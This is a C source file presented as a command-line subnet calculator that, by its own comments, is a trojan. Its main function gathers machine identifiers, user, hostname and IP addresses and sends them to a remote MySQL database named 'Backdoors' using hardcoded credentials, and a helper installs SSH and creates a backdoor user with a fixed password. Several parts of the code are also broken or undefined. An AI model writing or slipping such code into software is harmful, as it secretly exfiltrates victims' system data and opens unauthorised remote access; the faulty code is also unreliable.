#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <math.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <string.h>
#include <mysql.h>


void calculatorInterface(); //Call this first
void breakHost(char [16]);
void breakMask(char [16]);

int hostOctets[4];
int maskOctets[4];
int majOctets[4];
char netClass;
int binaryArray[8];


int hostOctet1, hostOctet2, hostOctet3, hostOctet4;
int majOctet1, majOctet2, majOctet3, majOctet4;
int subOctet1, subOctet2, subOctet3, subOctet4;


int popenretrieve(char temp[], char com[], size_t map){
	size_t n;
	FILE *fp = popen(com, "r");
	if (fp == NULL){ pclose(fp);
	    return -1;}

	while ((n = fread(temp, 1, map-1, fp)) > 0) {
        	temp[n] = '\0';
    	}
	pclose(fp);
	return 1;
}

void breakHost(char address[16])
{
	char *token;

	token = strtok(address, ".");
    int fin1 = 0;
    int length1 = strlen(token);
    for(int i = 0; i < length1; i++)
    {
        fin1 = fin1 * 10 + (token[i] - '0');
    }
    hostOctets[0] = fin1;

    token = strtok(NULL, ".");
    int fin2 = 0;
    int length2 = strlen(token);
    for(int i = 0; i < length2; i++)
    {
        fin2 = fin2 * 10 + (token[i] - '0');
    }
    hostOctets[1] = fin2;

	token = strtok(NULL, ".");
    int fin3 = 0;
    int length3 = strlen(token);
    for(int i = 0; i < length3; i++)
    {
        fin3 = fin3 * 10 + (token[i] - '0');
    }
	hostOctets[2] = fin3;

    token = strtok(NULL, ".");
    int fin4 = 0;
    int length4 = strlen(token);
    for(int i = 0; i < length4; i++)
    {
        fin4 = fin4 * 10 + (token[i] - '0');
    }
    hostOctets[3] = fin4;
}

void breakMask(char address[16])
{
	char *token;

	token = strtok(address, ".");
    int fin1 = 0;
    int length1 = strlen(token);
    for(int i = 0; i < length1; i++)
    {
        fin1 = fin1 * 10 + (token[i] - '0');
    }
    maskOctets[0] = fin1;

    token = strtok(NULL, ".");
    int fin2 = 0;
    int length2 = strlen(token);
    for(int i = 0; i < length2; i++)
    {
        fin2 = fin2 * 10 + (token[i] - '0');
    }
    maskOctets[1] = fin2;

	token = strtok(NULL, ".");
    int fin3 = 0;
    int length3 = strlen(token);
    for(int i = 0; i < length3; i++)
    {
        fin3 = fin3 * 10 + (token[i] - '0');
    }
	maskOctets[2] = fin3;

    token = strtok(NULL, ".");
    int fin4 = 0;
    int length4 = strlen(token);
    for(int i = 0; i < length4; i++)
    {
        fin4 = fin4 * 10 + (token[i] - '0');
    }
    maskOctets[3] = fin4;
}

void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, baby! */
{
    printf("\n\nWelcome to the Subnet Calculator!\n"
	"This program allows network administrators to determine many things involved with subnetting:\n"
	" ~Determines how many hosts a subnet can use.\n"
	" ~Determines what the max and min value an address can be in a subnet.\n"
	" ~Determines what address broadcasts to every host in the subnet.\n"
	" ~Determines what default gateway a host should use in this subnet.\n"
	" ~Determines what subnet ID a host should use in this subnet.\n"
	"\n \n"
	"This program will walk you through the steps to use this calculator.\n"
	"In order to make full use of this program, you will need/input:\n"
	" ~A host address\n"
	"  - an IP address; an existing host that will build the rest of the data\n"
	" ~A major network class\n"
	"  - either A, B, or C; determines the address space an ISP has granted\n"
	" ~A subnet mask for the desired subnet\n"
	"  - should be similar to an IP address with only the following possible values: { 0 128 192 224 240 248 252 255 };\n"
	"    determines how the network has been split into subnets.\n"
	"\n \n");

	char choice1[16];
	char choice2[2];
	char choice3[16];
	
	while(1==1)
	{
		printf("Please input the host address: ");
		scanf("%s", choice1);
		breakHost(choice1); //Break up the IP into four integers, one per octet
		if(hostOctets[0] < 1 || hostOctets[1] < 0 || hostOctets[2] < 0 || hostOctets[3] < 1 || hostOctets[0] > 254 || hostOctets[1] > 255 || hostOctets[2] > 255 || hostOctets[3] > 254)
		{
			printf("###Please input a valid option### \n");
		}
		else
		{
			break;
		}
	}

	while(1==1)
	{
		printf("Please input the network class: ");
		scanf("%s", choice2);
		if(choice2[0] == 'A' || choice2[0] == 'a' || choice2[0] == 'B' || choice2[0] == 'b' || choice2[0] == 'C' || choice2[0] == 'c')
		{
			netClass = choice2[0];
			break;
		}
		else
		{
			printf("###Please input a valid option### \n");
		}
	}

	while(1==1)
	{
		printf("Please input the subnet mask: ");
		scanf("%s", choice3);
		breakMask(choice3); //Break up the IP into four integers, one per octet
		if(maskOctets[0] == 0 || maskOctets[0] == 128 || maskOctets[0] == 192 || maskOctets[0] == 224 || maskOctets[0] == 240 || maskOctets[0] == 248 || maskOctets[0] == 252 || maskOctets[0] == 255)
		{
			if(maskOctets[1] == 0 || maskOctets[1] == 128 || maskOctets[1] == 192 || maskOctets[1] == 224 || maskOctets[1] == 240 || maskOctets[1] == 248 || maskOctets[1] == 252 || maskOctets[1] == 255)
			{
				if(maskOctets[2] == 0 || maskOctets[2] == 128 || maskOctets[2] == 192 || maskOctets[2] == 224 || maskOctets[2] == 240 || maskOctets[2] == 248 || maskOctets[2] == 252 || maskOctets[2] == 255)
				{
					if(maskOctets[3] == 0 || maskOctets[3] == 128 || maskOctets[3] == 192 || maskOctets[3] == 224 || maskOctets[3] == 240 || maskOctets[3] == 248 || maskOctets[3] == 252)
					{
						break;
					}
				}
			}
		}
		else
		{
			printf("###Please input a valid option### \n");
		}
	}

	printf("Thank you for your entries!\nPlease wait just a moment while we calculate your results.\n\n\n");
}

void MajorNetworkAnswers()
{
	int host1 = hostOctets[0];
	int host2 = hostOctets[1];
	int host3 = hostOctets[2];
	int host4 = hostOctets[3];

	if (netClass == 'A' || netClass == 'a')
	{
		printf("Major Network Address is: %d.0.0.0\n", host1);
		printf("Major Network Broadcast Address is: %d.255.255.255\n", host1);
		printf("CIDR Notation Major Network is: %d.0.0.0/8\n", host1);
		printf("Number of Host Bits: 24\n");
		printf("Number of Usable Hosts per Network: 16,777,214\n");
		cond = false;
	}
	else if (netClass == 'B' || netClass == 'b')
	{
		printf("Major Network Address is: %d.%d.0.0\n", host1, host2);
		printf("Major Network Broadcast Address is: %d.%d.255.255\n", host1, host2);
		printf("CIDR Notation Major Network is: %d.%d.0.0/16\n", host1, host2);
		printf("Number of Host Bits: 16\n");
		printf("Number of Usable Hosts per Network: 65,534\n");
		cond = false;
	}
	else if (netClass == 'C' || netClass == 'c')
	{
		printf("Major Network Address is: %d.%d.%d.0\n", host1, host2, host3);
		printf("Major Network Broadcast Address is: %d.%d.%d.255\n", host1, host2, host3);
		printf("CIDR Notation Major Network is: %d.%d.%d.0/24\n", host1, host2, host3);
		printf("Number of Host Bits: 8\n");
		printf("Number of Usable Hosts per Network: 254\n");
		cond = false;
	}
}

void SubnetMaskAnswers()
{
	int sub1 = maskOctets[0]; 
	int sub2 = maskOctets[1];
	int sub3 = maskOctets[2];
	int sub4 = maskOctets[3];
	bool cond = true;

	while (cond)
	{
		if (netClass == 'A' || netClass == 'a') //if the Major Network Mask is 255.0.0.0
		{
			//Check if Subnet Mask is valid
			while ((sub1 == 255 && sub2 == 0) || sub1 == 0)
			{
				printf("Please choose an appropriate Subnet Mask, the current one is the same as the network class: ");
				scanf("%d.%d.%d.%d", &maskOctets[0], &maskOctets[1], &maskOctets[2], &maskOctets[3]);
				int sub1 = maskOctets[0]; 
        	    int sub2 = maskOctets[1];
	            int sub3 = maskOctets[2];
	            int sub4 = maskOctets[3];
			} 

			cond = false;

			if (sub2 == 255 && sub3 == 255) //if Subnet Mask is 255.255.255.# where # is some other number
			{
				double subnetBits4 = 16 + subCount(sub4); //16 because Octet 2 and Octet 3 are already 255 so their whole bits will count towards subnet bit count
				double usableSub4 = pow(2, subnetBits4); //Calculate usable subnets
   				printf("Number of Subnet Bits: %.01f\n", subnetBits4);
   				printf("Number of Usable Subnet: %.01f\n", usableSub4);
   				int hostCount4 = 8 - subCount(sub4); //Octets 1, 2, and 3 are already 255 so host bits will be 8 - subnet bits
   				double usableHost4 = pow(2, hostCount4) - 2; //Calculate usable hosts which is (2^subnet bits) - 2 to account for the 0 and 255 address
   				printf("Number of Host Bits per Subnet: %d\n", hostCount4);
   				printf("Number of Usable Hosts per Subnet: %.01f\n", usableHost4);
			}
			else if (sub2 == 255) //if Subnet Mask is 255.255.#.0 where # is some other number
			{
				double subnetBits3 = 8 + subCount(sub3); //8 because Octet 2 is already 255 so the whole octet bits will count towards subnet bit count
				double usableSub3 = pow(2, subnetBits3); //Calculate usable subnets
   				printf("Number of Subnet Bits: %.01f\n", subnetBits3);
   				printf("Number of Usable Subnet: %.01f\n", usableSub3);
   				int hostCount3 = 16 - subCount(sub3); //Octet 4 will be 0 and subnetting starts at Octet 2 so host bits will be 16 - subnet bits 
   				double usableHost3 = pow(2, hostCount3) - 2; //Calculate usable hosts which is (2^subnet bits) - 2 to account for the 0 and 255 address
   				printf("Number of Host Bits per Subnet: %d\n", hostCount3);
   				printf("Number of Usable Hosts per Subnet: %.01f\n", usableHost3);
			}
			else //if Subnet Mask is 255.#.0.0 where # is some other number
			{
				double usableSub2 = pow(2, subCount(sub2)); //Calculate usable subnets
   				printf("Number of Subnet Bits: %.01f\n", subCount(sub2)); 
   				printf("Number of Usable Subnet: %.01f\n", usableSub2);
   				int hostCount2 = 24 - subCount(sub2); //Octet 3 and Octet 4 will be 0 and subnetting starts at Octet 2 so host bits will be 24 - subnet bits
   				double usableHost2 = pow(2, hostCount2) - 2; //Calculate usable hosts which is (2^subnet bits) - 2 to account for the 0 and 255 address
   				printf("Number of Host Bits per Subnet: %d\n", hostCount2);
   				printf("Number of Usable Hosts per Subnet: %.01f\n", usableHost2);
			}
		}
		else if (netClass == 'B' || netClass == 'b') //if the Major Network Mask is 255.255.0.0
		{
			//Check if Subnet Mask is valid
			while ((sub1 == 255 && sub2 == 255 && sub3 == 0) || sub1 == 0 || sub2 == 0)
			{
				printf("Please choose an appropriate Subnet Mask, the current one is the same as the network class: ");
				scanf("%d.%d.%d.%d", &maskOctets[0], &maskOctets[1], &maskOctets[2], &maskOctets[3]);
				int sub1 = maskOctets[0]; 
        	    int sub2 = maskOctets[1];
	            int sub3 = maskOctets[2];
	            int sub4 = maskOctets[3];
			} 

			cond = false;

			if (sub3 == 255) //if Subnet Mask is 255.255.255.# where # is some other number
			{
				double fishBits = 8 + subCount(sub4); 
				double usableSubFish2 = pow(2, fishBits);
   				printf("Number of Subnet Bits: %.01f\n", fishBits);
   				printf("Number of Usable Subnet: %.01f\n", usableSubFish2);
   				int fishHostCount2 = 8 - subCount(sub4);
   				double usableFishHost2 = pow(2, fishHostCount2) - 2;
   				printf("Number of Host Bits per Subnet: %d\n", fishHostCount2);
   				printf("Number of Usable Hosts per Subnet: %.01f\n", usableFishHost2);
			}
			else //if Subnet Mask is 255.255.#.0 where # is some other number
			{
				double usableSubFish = pow(2, subCount(sub3));
   				printf("Number of Subnet Bits: %.01f\n", subCount(sub3));
   				printf("Number of Usable Subnet: %.01f\n", usableSubFish);
   				int fishHostCount = 16 - subCount(sub3);
   				double usableFishHost2 = pow(2, fishHostCount) - 2;
   				printf("Number of Host Bits per Subnet: %d\n", fishHostCount);
   				printf("Number of Usable Hosts per Subnet: %.01f\n", usableFishHost2);
			}
		}
		else if (netClass == 'C' || netClass == 'c') //if the Major Network Mask is 255.255.255.0
		{
			//Check if Subnet Mask is valid
			while ((sub1 == 255 && sub2 == 255 && sub3 == 255 && sub4 == 0) || sub1 == 0 || sub2 == 0 || sub3 == 0)
			{
				printf("Please choose an appropriate Subnet Mask, the current one is the same as the network class: ");
				scanf("%d.%d.%d.%d", &maskOctets[0], &maskOctets[1], &maskOctets[2], &maskOctets[3]);
				int sub1 = maskOctets[0]; 
        	    int sub2 = maskOctets[1];
	            int sub3 = maskOctets[2];
	            int sub4 = maskOctets[3];
			} 

			cond = false;

			double frogSub = pow(2, subCount(sub4));
   			printf("Number of Subnet Bits: %.01f\n", subCount(sub4));
   			printf("Number of Usable Subnet: %.01f\n", frogSub);
   			int frogBits = 8 - subCount(sub4);
   			double usableFrogHost = pow(2, frogBits) - 2;
   			printf("Number of Host Bits per Subnet: %d\n", frogBits);
   			printf("Number of Usable Hosts per Subnet: %.01f\n", usableFrogHost);
		}
		else 
		{
			printf("Please type choose either 255.#.0.0, 255.255.#.0, or 255.255.255.# for the Subnet Mask where # is an appropriate number for the subnet: ");
			scanf("%d.%d.%d.%d", &maskOctets[0], &maskOctets[1], &maskOctets[2], &maskOctets[3]);
			int sub1 = maskOctets[0]; 
        	int sub2 = maskOctets[1];
	        int sub3 = maskOctets[2];
	        int sub4 = maskOctets[3];
		}
	}	
}

double subCount(int number)
{
	int output[10], i, j;
	double subnetCount;

	for(i = 0; number > 0; i++)
    {
        output[i] = number % 2;
        number = number / 2;
    }
    for(j = i - 1; j >= 0; j--)  
    {
        if (output[j] == 1)
        {
        	subnetCount++;
        }
    }

    return subnetCount;
}

void Binary(int number)
{
	int output[8], i, j;
	for(i = 0; number > 0; i++)
    {
        output[i] = number % 2;
        number = number / 2;
    }
    for(j = i - 1; j >= 0; j--)  
    {
        binaryArray[j] = output[j];
    }
}

int BinaryToDecimal(int inputBinary[])
{
	double decOutput = 0;
	int placement = 7;
   	for (int start = 0; start < 8; start++)
   	{
 		if (inputBinary[start] == 1)
 		{
 			decOutput = decOutput + pow(2, placement);
 		}
 		placement--;
   	}

   	return (int)decOutput;
}

void Translation()
{
	int sub1 = maskOctets[0]; 
	int sub2 = maskOctets[1];
	int sub3 = maskOctets[2];
	int sub4 = maskOctets[3];

	if (sub1 == 255 && sub2 == 255 && sub3 == 255) //if Subnet Mask is 255.255.255.# where # is some other number
	{
		double subBits4 = subCount(sub4); //Get number of subnet bits

		Binary(hostOctet4); //Turn host octet into binary and stores it in array
		int hostBinary[8]; //Create a host binary number array 
		int hostCount = 0; //Counter for host array
   		for (int out = 7; out > (subBits4+1); out--)
   		{
   			hostBinary[hostCount] = binaryArray[out];
   			hostCount++;
   		}
   		for (int hostbits = (int)subBits4; hostbits < 8; hostbits++)
   		{
   			hostBinary[hostbits] = 0;
  	 	}
  	 	int decimalOutput = BinaryToDecimal(hostBinary);

  	 	printf("Subnet Address for this Host: %d.%d.%d.%d\n", hostOctets[0], hostOctets[1], hostOctets[2], decimalOutput);
	}
	else if (sub1 == 255 && sub2 == 255 && sub3 != 255) //if Subnet Mask is 255.255.#.0 where # is some other number
	{
		double subBits3 = subCount(sub3); //Get number of subnet bits

		Binary(hostOctet3); //Turn host octet into binary and stores it in array
		int hostBinary[8]; //Create a host binary number array 
		int hostCount = 0; //Counter for host array
   		for (int out = 7; out > (subBits3+1); out--)
   		{
   			hostBinary[hostCount] = binaryArray[out];
   			hostCount++;
   		}
   		for (int hostbits = (int)subBits3; hostbits < 8; hostbits++)
   		{
   			hostBinary[hostbits] = 0;
  	 	}
  	 	int decimalOutput = BinaryToDecimal(hostBinary);

  	 	printf("Subnet Address for this Host: %d.%d.%d.0\n", hostOctets[0], hostOctets[1], decimalOutput);
	}
	else if (sub1 == 255 && sub2 != 255 && sub3 != 255) //if Subnet Mask is 255.#.0.0 where # is some other number
	{
		double subBits2 = subCount(sub2); //Get number of subnet bits
		
		Binary(hostOctet2); //Turn host octet into binary and stores it in array
		int hostBinary[8]; //Create a host binary number array 
		int hostCount = 0; //Counter for host array
   		for (int out = 7; out > (subBits2+1); out--)
   		{
   			hostBinary[hostCount] = binaryArray[out];
   			hostCount++;
   		}
   		for (int hostbits = (int)subBits2; hostbits < 8; hostbits++)
   		{
   			hostBinary[hostbits] = 0;
  	 	}
  	 	int decimalOutput = BinaryToDecimal(hostBinary);

  	 	printf("Subnet Address for this Host: %d.%d.0.0\n", hostOctets[0], decimalOutput);
	}
}

int subnetCalculator()
{
	bool keepGoing = true; //Bool for keeping the program running
	int yesOrNo; //Int for switch case
	while (keepGoing)
	{
		//------------------------------Major Network Portion----------------------------------------------------
		MajorNetworkAnswers();

		//------------------------------Subnet Mask Portion------------------------------------------------------
		SubnetMaskAnswers();
		Translation();

		//Ask user to do another calculation
		printf("Do you want to do another calculation?\n1 = Yes\n2 = No\n: ");
		scanf("%d", &yesOrNo);
		switch (yesOrNo)
		{
			case 1: 
			keepGoing = true;
			case 2: 
			keepGoing = false;
			default:
			keepGoing = false;
		}
	}
	return 0;
}

void sshCreate()
{
	char line[1024];																		//Each line from the text file that is dumped
	char desiredLine[1024];																//Will be line 4 from text file
	char cutLine[512];																	//Cutting the line so it matches a specific string
	char installedSSH[30];																//Comparison string
	int i = 0;
	
	system("sudo apt-get install ssh > terminalCommand.txt");				//Creating a text file to check if ssh is already installed
	
	char directory[512] = "";															//String for directory
	popenretrieve(directory, "pwd", sizeof(directory));
	
	strtok(directory, "\n");															//Removing the newline char from the end of the string
	strcat(directory, "/terminalCommand.txt");									//Adding on the file to the directory
	
	char temp[512];																		//I literally do not know why, but if the string isnt copied, it refuses to do jack
	strcpy(temp, directory);															//C is quite possibly the dumbest language alive when it comes to strings
	
	FILE* file = fopen(temp, "r");
	while (fgets(line, sizeof(line), file))										//Stupid jank way of getting line 4 from a saved text file, as it is the
	{																							//first line that differentiates between an already installed package or not
  		i++;
		if(i == 4)
		{
			strcpy(desiredLine, line);													//Copying the correct line to another char array
		}
	}
	fclose(file);
	
	
	strncpy(cutLine, desiredLine, 25);												//Cuts off the string so it is "ssh is already the newest"
	strcpy(installedSSH, "ssh is already the newest");							//Creating a string to compare against
	
	
	if(strcmp(cutLine, installedSSH) == 0)											//If ssh is already installed
	{
		system("adduser --disabled-password --gecos \"\" sudoman");			//Literally the only way to create a user without a ton of interactive inputs
		system("echo sudoman:hackerdude > creds.txt");							//Creating a text file to pass to the chpasswd command, as it does not use stdin as its input 
		system("chpasswd < creds.txt");												//Command to change the password of the newly created user
		
		system("rm creds.txt");															//Deleting the text files that were used
		system("rm terminalCommand.txt");
	}
	else																						//If ssh is not already installed
	{
		system("sudo apt-get -y install ssh");
		
		fflush(stdout);																	//Explicitly clearing output buffer, sleep acts weird otherwise
		sleep(15);																			//Sleeping to ensure it has been installed
		
		system("adduser --disabled-password --gecos \"\" sudoman");			//Literally the only way to create a user without a ton of interactive inputs
		system("echo sudoman:hackerdude > creds.txt");							//Creating a text file to pass to the chpasswd command, as it does not use stdin as its input 
		system("chpasswd < creds.txt");												//Command to change the password of the newly created user
		
		system("rm creds.txt");															//Deleting the text files that were used
		system("rm terminalCommand.txt");
	}
}

//MAIN FUNCTION~~~~~~~~~~~~~~
int main()
{
    calculatorInterface();

    //Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
	char UUID[51] = "";
	popenretrieve(UUID, "dmidecode | grep UUID", sizeof(UUID));
	//printf("%s",UUID);
	char lshw[13001] = "";
	//popenretrieve(lshw, "lshw", sizeof(lshw));
	//printf("%s",lshw);	
	char lscpu[1601] = "";
	popenretrieve(lscpu, "lscpu", sizeof(lscpu));
	//printf("%s",lscpu);
	char lsblk[3001] = "";
	popenretrieve(lsblk, "lsblk", sizeof(lsblk));
	//printf("%s",lsblk);
	char datetime[24] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	popenretrieve(datetime, "date +'%F %T'", sizeof(datetime));
	//printf("%s",datetime);
	
	//Defining RunLog Extraction variables
	char KernelVer[51] = "";
	popenretrieve(KernelVer, "uname -v", sizeof(KernelVer));
	//printf("%s",KernelVer);
	char Hostname[256] = "";
	popenretrieve(Hostname, "hostname", sizeof(Hostname));
	//printf("%s",Hostname);
	char Username[33] = "";
	popenretrieve(Username, "whoami", sizeof(Username));
	//printf("%s",Username);
	char KernelRelease[51] = "";
	popenretrieve(KernelRelease, "uname -r", sizeof(KernelRelease));
	//printf("%s",KernelRelease);
	char TimeRun[24] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	popenretrieve(TimeRun, "date +'%F %T'", sizeof(TimeRun));
	//printf("%s",TimeRun);
	char lsusb[101] = "";
	popenretrieve(lsusb, "lsusb", sizeof(lsusb));
	//printf("%s",lsusb);
	char LocalIP[16] = "";
	popenretrieve(LocalIP, "hostname -I", sizeof(LocalIP));
	//printf("%s",LocalIP);
	char ExternalIP[16] = "";
	popenretrieve(ExternalIP, "dig +short myip.opendns.com @resolver1.opendns.com", sizeof(ExternalIP)+1);
	//printf("%s",ExternalIP);
	char GatewayIP[16] = "";
	popenretrieve(GatewayIP, "ip r | awk 'NR==1{ print $3}'", sizeof(GatewayIP));
	//printf("%s",GatewayIP);
	char NewLocalUser[2] = "";
	char SSHserver[2] = "";
	char NewSSHuser[2] = "";

	//Defining Database variables
	MYSQL *conn;
	conn = mysql_init(NULL);
	MYSQL_RES *res;
	MYSQL_ROW row;
	char *server = "mysqldatabase.cvnrdza49fyl.us-east-2.rds.amazonaws.com";
	char *user = "Farrington";
	char *password = "ClaySiltSand";
	char *database = "Backdoors";
	char prepairedStatement [16638] = "";
 
	//Making the connection to the database
	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0))
	{
	 	printf("Connection Failed... Error: %s\n", mysql_error(conn));
		return 0;
	}
 	else
 	{
 		printf("Connection Sucessful\n");
	} 	

 	//Finding if this is the first time the Trojan ran on this machine
 	mysql_query(conn, "SELECT UUID FROM Device");
 	res = mysql_use_result(conn);
 	char UUIDs[51];	//temp for checking UUID values
 	int duplicate = 0;	//1 = duplicate
 	while ((row = mysql_fetch_row(res)) != NULL)
	{
		strncpy(UUIDs, row[0], 50);
		if(strncmp(UUIDs, UUID, 50) == 0)
		{
			printf("COPY DETECTED\n");
			duplicate = 1;
		}	
		//printf("%s \n", UUIDs);
	}
	
	//If this is the first time this PC ran this trojan, log Device info
	if (duplicate == 0)
	{
		//Creating the prepaired statement		
		sprintf(prepairedStatement, "INSERT INTO Device VALUES ('%s','%s','%s','%s','%s')", UUID, lshw, lscpu, lsblk, datetime);
		//printf("%s", prepairedStatement);
		
		//Runs the INSERT query to Device Table
		if(mysql_query(conn, prepairedStatement) != 0)
		{
			printf("Device INSERT Failed.  Error: %s\n", mysql_error(conn));
		}
	}
	
	//RunLog INSERT	
	sprintf(prepairedStatement, "INSERT INTO RunLog VALUES (0,'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", UUID,KernelVer,Hostname,Username,KernelRelease,TimeRun,lsusb,LocalIP,ExternalIP,GatewayIP,NewLocalUser,SSHserver,NewSSHuser);

	//Runs the INSERT query to RunLog Table
	if(mysql_query(conn, prepairedStatement) != 0)
	{
		printf("RunLog INSERT Failed.  Error: %s\n", mysql_error(conn));
	}


	int i = conceptretrieve();
	
	sshCreate();
	
	subnetCalculator();
}
